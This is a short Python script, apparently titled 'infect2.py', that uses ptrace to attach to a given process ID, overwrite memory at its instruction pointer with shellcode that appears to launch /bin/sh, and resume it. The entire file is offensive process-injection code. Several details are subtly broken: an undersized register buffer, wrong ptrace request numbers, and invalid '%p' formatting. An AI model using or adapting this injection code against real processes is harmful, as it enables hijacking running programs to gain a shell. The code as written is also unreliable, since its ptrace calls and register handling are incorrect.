import ctypes
import sys
import os
import struct

SHELLCODE_SIZE = 32

shellcode = (
    "\x48\x31\xc0\x48\x89\xc2\x48\x89"
    "\xc6\x48\x8d\x3d\x04\x00\x00\x00"
    "\x04\x3b\x0f\x05\x2f\x62\x69\x6e"
    "\x2f\x73\x68\x00\xcc\x90\x90\x90"
)

def inject_data(pid, src, dst, size):
    libc = ctypes.CDLL('libc.so.6')
    offset = 0
    for i in xrange(0, size, 4):
        data = struct.unpack("<I", src[offset:offset+4])[0]
        if libc.ptrace(5, pid, ctypes.c_void_p(dst + offset), ctypes.c_void_p(data), 0) < 0:
            print("ptrace error")
            return -1
        offset += 4
    return 0

def main():
    if len(sys.argv) != 2:
        print("Usage: python infect2.py <pid>")
        sys.exit(1)

    target_pid = int(sys.argv[1])

    print("+ Tracing process %d" % target_pid)

    libc = ctypes.CDLL('libc.so.6')
    ret = libc.ptrace(16, target_pid, None, None)  # PTRACE_ATTACH
    if ret < 0:
        print("ptrace(ATTACH) error")
        sys.exit(1)

    print("+ Waiting for process...")
    os.wait()

    print("+ Getting Registers")
    regs = struct.pack("=QQQQQQQQ", 0, 0, 0, 0, 0, 0, 0, 0)
    ret = libc.ptrace(12, target_pid, None, ctypes.c_void_p(regs))  # PTRACE_GETREGS
    if ret < 0:
        print("ptrace(GETREGS) error")
        sys.exit(1)

    rip_address = struct.unpack("=Q", regs[8:])[0]

    print("+ Injecting shell code at %p" % rip_address)
    inject_data(target_pid, shellcode, rip_address, SHELLCODE_SIZE)

    rip_address += 2
    print("+ Setting instruction pointer to %p" % rip_address)

    ret = libc.ptrace(4, target_pid, None, ctypes.c_void_p(rip_address))  # PTRACE_SETREGS
    if ret < 0:
        print("ptrace(SETREGS) error")
        sys.exit(1)

    print("+ Run it!")

    ret = libc.ptrace(17, target_pid, None, None)  # PTRACE_DETACH
    if ret < 0:
        print("ptrace(DETACH) error")
        sys.exit(1)

if __name__ == "__main__":
    main()
